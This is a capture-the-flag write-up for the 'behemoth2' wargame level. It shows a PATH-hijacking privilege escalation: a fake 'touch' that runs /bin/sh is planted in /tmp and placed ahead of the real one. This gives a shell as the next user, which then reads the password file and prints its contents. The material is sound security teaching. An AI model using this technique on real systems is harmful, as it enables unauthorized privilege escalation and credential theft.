# behemoth2

I've SCP'ed the binary to my local directory. Let's take a look.
```
root@kali:~/Crack Me# ./behemoth2


```
When we execute the binary, we see nothing happens. However, upon further inspection, we find that the binary has created a file.
```
root@kali:~/Crack Me# ls
1861
```
Upon inspection, we find the file created is an empty file. However, without looking at the binary, we can already find a vulnerability; since the binary as the ability to call `touch` (obviously, since it created a file), it must have a call to `system`. An interesting consequence of this is when command line commands are called, they are referenced by the PATH environmental variable. Thus, we can exploit this by changing the PATH variable to reference our own `touch` command.
```
behemoth2@behemoth:/behemoth$ mkdir /tmp/touch_command
behemoth2@behemoth:/behemoth$ cd /tmp/touch_command
behemoth2@behemoth:/tmp/touch_command$ echo /bin/sh > touch
behemoth2@behemoth:/tmp/touch_command$ cat touch
/bin/sh
behemoth2@behemoth:/tmp/touch_command$ chmod +x touch
```
Great. Let's update our path variable accordingly.
```
behemoth2@behemoth:/tmp/touch_command$ export PATH=/tmp/touch_command:$PATH
```
And now let's see if our theory was correct.
```
behemoth2@behemoth:/behemoth$ ./behemoth2
$ whoami
behemoth3
$ cat /etc/behemoth_pass/behemoth3
nieteidiel
```
